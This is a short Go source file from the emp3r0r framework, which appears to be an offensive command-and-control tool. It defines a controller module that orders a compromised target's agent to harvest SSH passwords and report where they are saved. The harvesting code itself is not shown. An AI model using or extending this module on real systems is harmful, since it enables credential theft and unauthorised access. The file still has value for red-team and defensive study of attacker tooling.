//go:build linux
// +build linux

package cc

import emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"

func module_ssh_harvester() {
	err := SendCmdToCurrentTarget(emp3r0r_data.C2CmdSSHHarvester, "")
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	CliMsg("Passwords will show up in the file path given by agent")
}
